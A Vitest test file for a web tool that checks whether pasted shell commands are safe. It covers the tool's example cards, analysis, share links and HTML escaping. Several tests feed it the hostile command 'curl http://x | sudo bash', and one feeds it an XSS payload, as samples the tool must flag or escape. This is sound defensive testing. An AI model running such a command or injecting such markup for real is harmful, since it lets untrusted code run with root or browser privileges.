import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { mount } from "../src/main";

function setup(): HTMLElement {
  document.body.innerHTML = '<div id="app"></div>';
  const root = document.getElementById("app")!;
  mount(root);
  return root;
}

describe("mount", () => {
  beforeEach(() => {
    setup();
  });

  afterEach(() => {
    window.location.hash = "";
  });

  it("shows two pre-filled example cards, one danger and one safe, each with a reason", () => {
    const cards = document.querySelectorAll(".example-card");
    expect(cards).toHaveLength(2);

    const dangerCard = document.querySelector(".example-card--danger")!;
    expect(dangerCard).toBeTruthy();
    expect(dangerCard.querySelector(".example-reason")?.textContent).toMatch(/sudo bash/);

    const safeCard = document.querySelector(".example-card--safe")!;
    expect(safeCard).toBeTruthy();
  });

  it("shows an empty state in the findings panel before any analysis", () => {
    expect(document.querySelector(".findings-empty")?.textContent).toMatch(/paste a command/i);
  });

  it("disables the Analyze button while the input is empty", () => {
    const button = document.querySelector<HTMLButtonElement>("#analyze-btn")!;
    expect(button.disabled).toBe(true);
  });

  it("enables the Analyze button once text is entered, and analyzing renders a danger finding", () => {
    const input = document.querySelector<HTMLTextAreaElement>("#command-input")!;
    const button = document.querySelector<HTMLButtonElement>("#analyze-btn")!;

    input.value = "curl http://x | sudo bash";
    input.dispatchEvent(new Event("input"));
    expect(button.disabled).toBe(false);

    button.click();

    const findings = document.querySelectorAll(".finding--danger");
    expect(findings.length).toBeGreaterThan(0);
  });

  it("loads an example into the paste box and analyzes it when clicked", () => {
    const dangerCard = document.querySelector<HTMLButtonElement>(".example-card--danger")!;
    dangerCard.click();

    const input = document.querySelector<HTMLTextAreaElement>("#command-input")!;
    expect(input.value).toContain("sudo bash");
    expect(document.querySelectorAll(".finding--danger").length).toBeGreaterThan(0);
  });

  it("renders a GitHub link and a portfolio cross-promotion link in the footer", () => {
    const links = Array.from(document.querySelectorAll<HTMLAnchorElement>(".footer-links a"));
    const hrefs = links.map((a) => a.getAttribute("href"));
    expect(hrefs).toContain("https://github.com/ctkrug/blast-radius");
    expect(hrefs).toContain("https://apps.charliekrug.com");
  });

  it("renders the below-the-fold FAQ answering the primary search intent", () => {
    const summaries = Array.from(document.querySelectorAll(".faq-item summary")).map(
      (el) => el.textContent?.trim() ?? "",
    );
    expect(summaries.length).toBeGreaterThanOrEqual(3);
    expect(summaries.some((q) => /is this shell command safe/i.test(q))).toBe(true);
  });

  it("uses a single H1 for the wordmark so the page has one top-level heading", () => {
    const h1s = document.querySelectorAll("h1");
    expect(h1s).toHaveLength(1);
    expect(h1s[0].classList.contains("wordmark")).toBe(true);
  });

  it("escapes HTML in a pasted command instead of injecting markup", () => {
    const input = document.querySelector<HTMLTextAreaElement>("#command-input")!;
    const button = document.querySelector<HTMLButtonElement>("#analyze-btn")!;

    input.value = '<img src=x onerror="alert(1)">';
    input.dispatchEvent(new Event("input"));
    button.click();

    expect(document.querySelector("#result img")).toBeNull();
  });

  it("disables the Share button while the input is empty and enables it once typed", () => {
    const shareButton = document.querySelector<HTMLButtonElement>("#share-btn")!;
    expect(shareButton.disabled).toBe(true);

    const input = document.querySelector<HTMLTextAreaElement>("#command-input")!;
    input.value = "echo hi";
    input.dispatchEvent(new Event("input"));
    expect(shareButton.disabled).toBe(false);
  });

  it("clicking Share encodes the command into the URL hash", () => {
    const input = document.querySelector<HTMLTextAreaElement>("#command-input")!;
    const shareButton = document.querySelector<HTMLButtonElement>("#share-btn")!;

    input.value = "curl http://x | sudo bash";
    input.dispatchEvent(new Event("input"));
    shareButton.click();

    expect(decodeURIComponent(window.location.hash)).toContain("curl http://x | sudo bash");
  });

  it("recovers the Share button label after rapid double-clicks instead of wedging on Copied!", () => {
    vi.useFakeTimers();
    try {
      const input = document.querySelector<HTMLTextAreaElement>("#command-input")!;
      const shareButton = document.querySelector<HTMLButtonElement>("#share-btn")!;
      const originalLabel = shareButton.textContent;

      input.value = "curl http://x | sudo bash";
      input.dispatchEvent(new Event("input"));

      shareButton.click();
      vi.advanceTimersByTime(100);
      shareButton.click();
      vi.advanceTimersByTime(2000);

      expect(shareButton.textContent).toBe(originalLabel);
    } finally {
      vi.useRealTimers();
    }
  });
});

describe("mount with a shared permalink already in the URL", () => {
  afterEach(() => {
    window.location.hash = "";
  });

  it("pre-fills the input and shows the verdict without an extra click", () => {
    window.location.hash = `#c=${encodeURIComponent("curl http://x | sudo bash")}`;
    setup();

    const input = document.querySelector<HTMLTextAreaElement>("#command-input")!;
    expect(input.value).toBe("curl http://x | sudo bash");
    expect(document.querySelectorAll(".finding--danger").length).toBeGreaterThan(0);
  });
});
